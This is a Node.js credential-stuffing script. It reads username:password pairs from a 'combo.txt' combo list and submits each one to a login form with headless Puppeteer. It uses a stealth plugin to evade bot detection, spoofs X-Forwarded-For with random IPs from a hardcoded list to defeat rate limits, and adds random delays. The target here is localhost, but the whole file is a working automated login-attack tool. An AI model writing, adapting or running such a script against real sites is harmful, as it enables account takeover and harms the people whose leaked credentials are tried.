var fs = require("fs");
var path = require("path");

const puppeteer = require("puppeteer-extra");
const pluginStealth = require("puppeteer-extra-plugin-stealth");
puppeteer.use(pluginStealth());

let ips = [
  "107.20.152.119",
  "107.20.164.163",
  "107.20.211.50",
  "107.22.217.223",
  "107.22.251.236",
  "109.104.89.117",
  "109.104.89.118",
  "109.203.203.60",
  "109.238.179.88",
  "111.186.98.161",
  "113.192.9.214",
  "113.192.9.216",
  "113.192.9.221",
  "113.195.131.33",
  "114.113.159.154",
  "114.134.75.182",
  "116.228.226.213",
  "117.41.235.26",
  "118.102.27.216",
  "118.174.131.94",
  "118.175.14.51",
  "119.254.12.171",
  "121.11.149.250",
  "121.22.48.194",
  "122.155.0.135",
  "122.194.11.208",
  "123.129.242.131",
  "123.202.134.8",
  "123.242.172.4",
  "124.241.129.164",
  "124.95.137.140",
  "124.95.137.140",
  "124.95.137.140",
  "125.64.227.86",
  "125.88.125.201",
  "130.14.29.110",
  "130.14.29.111",
  "130.14.29.120",
  "140.113.238.229",
  "141.89.68.48",
  "159.224.234.208",
  "160.79.35.27",
  "162.105.249.229",
  "164.77.196.75",
  "164.77.196.78",
  "173.10.134.173",
  "173.2.29.209",
  "174.142.125.161"
];

let content = fs.readFileSync(path.join(__dirname, "combo.txt"), "utf-8");
let pairs = content.toString().split("\n");
let credentials = [];
pairs.forEach(element => {
  res = element.split(":");
  credentials.push(res);
});

puppeteer
  .launch({
    args: ["--no-sandbox", "--lang=en-GB,en-US;q=0.9,en;q=0.8"],
    headless: true
  })
  .then(async browser => {
    const page = await browser.newPage();
    await page.setViewport({ width: 800, height: 600 });
    for (const credential of credentials) {
      page.setExtraHTTPHeaders({
        "X-Forwarded-For": ips[Math.floor(Math.random() * ips.length)]
      });
      await page.goto("http://localhost:8080");
      await page.type(".login-form input[type='text']", credential[0], {
        delay: 15
      });
      await page.type(".login-form input[type='password']", credential[1], {
        delay: 15
      });
      await page.evaluate(() => {
        document
          .querySelector(".login-form")
          .querySelector("button")
          .click();
      });
      await page.waitFor(Math.floor(Math.random() * (300 - 50) + 50));
    }
    await browser.close();
  });
